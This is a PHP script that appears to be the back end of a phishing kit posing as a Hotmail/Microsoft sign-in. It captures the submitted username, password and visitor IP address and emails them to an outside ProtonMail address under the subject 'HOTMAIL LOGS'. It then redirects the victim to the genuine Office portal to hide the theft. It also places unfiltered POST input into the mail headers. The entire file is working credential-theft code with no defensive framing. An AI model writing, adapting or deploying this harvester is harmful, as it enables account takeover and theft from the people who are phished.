<?php

$ip = getenv("REMOTE_ADDR");

$message .= "-----------  ! +Account infoS+ !  -----------\n";
$message .= "Username   : ".$_POST['work']."\n";
$message .= "Password   : ".$_POST['passwd']."\n";
$message .= "IP Address : ".$ip."\n";
$message .= "-----------  !Thuglife_Legend+ !  -----------\n";
$send = "sp_logs2021@protonmail.com";


$subject = "2021 HOTMAIL LOGS ! xD $ip";
$headers = "From:  <info@notime>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
mail($send,$subject,$message,$headers);
    

header("Location: https://portal.office.com/servicestatus?");

?>


